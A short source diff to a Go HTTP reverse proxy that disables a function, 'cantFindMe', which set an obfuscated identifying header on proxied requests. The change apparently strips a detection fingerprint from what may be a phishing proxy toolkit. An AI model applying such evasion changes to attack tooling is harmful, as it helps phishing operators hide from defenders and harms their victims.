@@ -578,7 +578,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				p.cantFindMe(req, e_host)
+				//p.cantFindMe(req, e_host)
 			}
 
 			return req, nil
@@ -1456,6 +1456,7 @@ func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
 	return sid, ok
 }
 
+/*
 func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
 	var b []byte = []byte("\x1dh\x003,)\",+=")
 	for n, c := range b {
@@ -1463,6 +1464,7 @@ func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
 	}
 	req.Header.Set(string(b), nothing_to_see_here)
 }
+*/
 
 func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
 	if enabled {
